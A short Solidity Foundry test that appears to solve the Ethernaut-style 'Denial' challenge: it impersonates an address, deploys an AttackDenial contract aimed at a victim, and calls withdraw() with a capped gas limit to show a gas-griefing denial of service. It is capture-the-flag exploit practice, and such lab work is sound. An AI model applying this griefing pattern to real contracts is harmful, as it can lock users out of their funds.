// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "src/AttackDenial.sol";

contract TestDenial is Test {
    AttackDenial x;
    function setUp() public {}

    function testDenial() public{
        
        vm.startPrank(0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1,0x9bdcf9696e273aFd83992b1Fb5672A70532ca9E1);     
        console.log(gasleft());                   
        address victim = 0x7e5feE786eD40d5728AB6457888F13aB6CA32891;                
        x = new AttackDenial(victim);         
        IDenial d = IDenial(0xf7FBC30918b7DDA370a342a5E265db2884771D68);
        bytes memory payload = abi.encodeWithSignature("withdraw()");
        (bool success,) = address(d).call{gas: 1000000}(payload);
        console.log(gasleft());                   
        vm.stopPrank();
    }
}

